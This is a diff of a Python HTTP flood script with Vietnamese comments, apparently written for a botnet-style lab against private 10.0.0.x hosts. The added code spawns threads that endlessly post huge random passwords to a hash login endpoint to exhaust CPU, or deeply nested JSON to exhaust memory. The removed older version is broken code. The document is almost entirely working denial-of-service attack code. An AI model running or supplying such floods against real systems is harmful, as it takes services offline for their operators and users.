@@ -1,112 +1,109 @@
-'''import requests
-import sys
-import urllib3
-import random
-import string
-import json
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-target = sys.argv[1] if len(sys.argv) > 1 else "https://10.0.0.10"
-# Sửa chữ http thành https ở dòng này:
-if not target.startswith('http://') and not target.startswith('https://'):
-    target = f"https://{target}"
-# Cờ xác định kiểu tấn công: 'hash' hoặc 'json'
-attack_type = sys.argv[2] if len(sys.argv) > 2 else "hash"
-
-print(f"[*] Bắt đầu L7 Application Flood vào {target} (Kiểu: {attack_type.upper()})...")
-
-request_count = 0
-
-def generate_long_string(min_len=1000, max_len=100000):
-    """Tạo một chuỗi ngẫu nhiên với độ dài biến thiên"""
-    length = random.randint(min_len, max_len)
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-
-def generate_deep_json():
-    """Tạo một cấu trúc JSON lồng nhau ngẫu nhiên"""
-    depth = random.randint(5, 20)
-    breadth = random.randint(2, 5)
-    dummy_dict = {}
-    current_level = dummy_dict
-    for i in range(depth):
-        current_level[f"level_{i}"] = {}
-        for j in range(breadth):
-            current_level[f"level_{i}"][f"data_{j}"] = generate_long_string(10, 100)
-        current_level = current_level[f"level_{i}"]
-    return dummy_dict
-
-try:
-    while True:
-        try:
-            if attack_type == "hash":
-                # Tấn công CPU: Gửi mật khẩu dài ngẫu nhiên
-                data = {'password': generate_long_string()}
-                requests.post(f"{target.rstrip('/')}/api/hash_login", data=data, verify=False, timeout=5)
-                request_count += 1
-                
-            elif attack_type == "json":
-                # Tấn công RAM/CPU: Gửi payload JSON biến thiên
-                payload = generate_deep_json()
-                headers = {'Content-Type': 'application/json'}
-                requests.post(f"{target.rstrip('/')}/api/process_json", json=payload, headers=headers, verify=False, timeout=5)
-                request_count += 1
-            
-            # Thêm khoảng nghỉ ngẫu nhiên để tránh pattern tĩnh
-            time.sleep(random.uniform(0.1, 0.5))
-                
-                # IN RA TẤT CẢ ĐỂ DEBUG
-                print(f"[DEBUG] Request {request_count} - Status: {response.status_code} - Text: {response.text[:50]}")
-                
-            else:
-                requests.get(target, verify=False, timeout=1)
-                request_count += 1
-                
-        except Exception as e:
-            # KHÔNG ĐƯỢC DÙNG 'pass' NỮA. HÃY IN LỖI RA!
-            print(f"[LỖI KẾT NỐI] {e}")
-            import time
-            time.sleep(1) # Nghỉ 1s để màn hình không bị trôi quá nhanh khi có lỗi
-            
-except KeyboardInterrupt:
-    print(f"\n[*] Đã dừng tấn công. Tổng request: {request_count}")'''
-
 import requests
 import sys
 import urllib3
 import random
 import string
 import threading
+import json
 import os
+import time
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-target = sys.argv[1] if len(sys.argv) > 1 else "http://10.0.0.10:8000"
-if not target.startswith('http://') and not target.startswith('https://'):
-    target = f"http://{target}:8000"
 
-print(f"[HTTP_FLOOD] Process {os.getpid()} - Bắt đầu Flood đa luồng vào {target}...")
+# Parse command line arguments
+# Cú pháp: python http_flood.py [target] [attack_type]
+#   target: URL (http://...) hoặc IP, hoặc 'hash'/'json' để dùng default
+#   attack_type: 'hash' hoặc 'json'
 
-# Hàm tạo payload tốn RAM
-def generate_long_string(length=50000):
+if len(sys.argv) > 1:
+    arg1 = sys.argv[1]
+    # Nếu arg1 là hash hoặc json -> dùng default target, arg1 là attack_type
+    if arg1 in ['hash', 'json']:
+        target = "http://10.0.0.11:8000"  # Default: web1 trực tiếp
+        attack_type = arg1
+    else:
+        # arg1 là target
+        target = arg1
+        if not target.startswith('http://') and not target.startswith('https://'):
+            target = f"http://{target}:8000"
+        # arg2 là attack_type (nếu có)
+        attack_type = sys.argv[2] if len(sys.argv) > 2 else "hash"
+else:
+    target = "http://10.0.0.11:8000"
+    attack_type = "hash"
+
+print(f"[HTTP_FLOOD] Target: {target} | Attack: {attack_type}")
+
+print(f"[HTTP_FLOOD] Process {os.getpid()} - Kiểu: {attack_type.upper()} - Target: {target}")
+
+# Hàm tạo payload
+def generate_long_string(min_len=1000, max_len=5000):
+    """Tạo chuỗi ngẫu nhiên với độ dài biến thiên"""
+    length = random.randint(min_len, max_len)
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-def blast():
-    """Hàm bắn phá không ngừng nghỉ, không chờ đợi"""
+def generate_deep_json():
+    """Tạo cấu trúc JSON lồng nhau ngẫu nhiên để tấn công RAM"""
+    depth = random.randint(5, 15)
+    breadth = random.randint(2, 4)
+    dummy_dict = {}
+    current_level = dummy_dict
+    for i in range(depth):
+        current_level[f"level_{i}"] = {}
+        for j in range(breadth):
+            current_level[f"level_{i}"][f"data_{j}"] = generate_long_string(50, 200)
+        current_level = current_level[f"level_{i}"]
+    return dummy_dict
+
+def blast_hash():
+    """Tấn công CPU: Gửi request hash liên tục"""
+    count = 0
     while True:
         try:
-            data = {'password': generate_long_string()}
-            # BÍ KÍP: Ép timeout cực thấp (0.1s). Gửi xong là bỏ chạy ngay!
-            requests.post(f"{target.rstrip('/')}/api/hash_login", data=data, verify=False, timeout=0.1)
-        except Exception:
-            # TUYỆT ĐỐI KHÔNG DÙNG TIME.SLEEP Ở ĐÂY NỮA
-            pass
+            # Payload 12000 - hash ~1-1.5s, cực kỳ tốn CPU, đủ lâu để giữ server bận
+            data = {'password': generate_long_string(12000, 12000)}
+            url = f"{target.rstrip('/')}/api/hash_login"
+            # Timeout 30s - đợi server xử lý kể cả khi bị tấn công nặng
+            r = requests.post(url, data=data, verify=False, timeout=30)
+            count += 1
+            if count <= 5:  # Chỉ log 5 lần đầu
+                print(f"[BLAST_HASH] Request #{count} sent to {url}, status: {r.status_code}")
+        except Exception as e:
+            if count <= 5:
+                print(f"[BLAST_HASH] Error: {e}")
+        # Nghỉ 5ms - gần như không nghỉ, luôn gửi request mới
+        time.sleep(0.005)
 
-# Tạo 30 nòng súng (Threads) cho MỖI máy Bot (Tổng 20 bot = 600 luồng HTTP đồng thời)
-for _ in range(30):
-    threading.Thread(target=blast, daemon=True).start()
+def blast_json():
+    """Tấn công RAM: Gửi payload JSON lớn"""
+    while True:
+        try:
+            payload = generate_deep_json()
+            headers = {'Content-Type': 'application/json'}
+            requests.post(f"{target.rstrip('/')}/api/process_json", json=payload, headers=headers, verify=False, timeout=3)
+        except Exception:
+            pass
+        # Nghỉ 200ms giữa các request JSON (tạo nhanh hơn vì server chỉ lưu vào memory)
+        time.sleep(0.2)
+
+# Chọn hàm tấn công theo loại
+if attack_type == "hash":
+    print("[*] Tấn công CPU (Hash) - Đánh vào /api/hash_login")
+    target_func = blast_hash
+elif attack_type == "json":
+    print("[*] Tấn công RAM (JSON) - Đánh vào /api/process_json")
+    target_func = blast_json
+else:
+    print(f"[*] Không xác định kiểu '{attack_type}', mặc định dùng hash")
+    target_func = blast_hash
+
+# Tạo 10 threads - luôn có nhiều request đang chờ server xử lý
+for _ in range(10):
+    threading.Thread(target=target_func, daemon=True).start()
 
 try:
     # Giữ script chạy mãi mãi
-    while True: 
-        pass
+    while True:
+        time.sleep(1)
 except KeyboardInterrupt:
     print(f"\n[*] Đã dừng tấn công HTTP.")
